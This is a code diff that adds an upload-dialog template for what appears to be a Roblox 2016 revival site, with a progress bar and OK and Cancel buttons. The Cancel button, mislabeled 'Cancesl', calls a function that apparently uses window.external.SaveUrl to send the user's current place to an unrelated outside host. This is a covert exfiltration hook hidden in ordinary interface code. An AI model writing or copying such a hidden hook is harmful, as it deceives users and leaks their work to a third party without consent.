@@ -1,0 +1,31 @@
+<script>
+    function grr() {
+		window.external.SaveUrl('https://hex.cirroskais.xyz/cum')
+	}
+    function close(){
+        window.close()
+        return false;
+    }
+
+    document.getElementById('cancelButton').addEventListener('click', grr)
+
+    document.getElementById('okButton').addEventListener("click", function () {
+        window.close();
+        return false;
+    });
+</script>
+
+<div class="boxed-body">
+    <h3>Uploading to "<%= gamename %>"</h3>
+    <div id="progressBarWrapper">
+        <div id="uploadProgressBar"
+            data-upload-url="http://data.rbx2016.nl/Data/Upload.ashx?assetid=<%= gameid %>&amp;type=Place&amp;ispublic=False&amp;t=<%= xcsrftoken %>&amp;groupId="
+            data-previous-url="http://www.rbx2016.nl/ide/publish/newplace" data-newupload="<%= newUpload %>" data-assetid="<%= gameid %>"
+            data-isplace="True" data-ispackage="False">
+            <div id="progressAmount" class="progress-blue-bar" style="width:0%;">
+            </div>
+        </div>
+        <a class="btn-medium btn-negative uploadCancel" href="javascript:grr()" id="cancelButton">Cancesl</a>
+        <a style="" class="btn-medium btn-neutral uploadOK" href="javascript:close()" id="okButton">OK</a>
+        <a style="display: none;" class="btn-medium blue-arrow uploadNext" id="nextButton">Next</a>
+    </div>
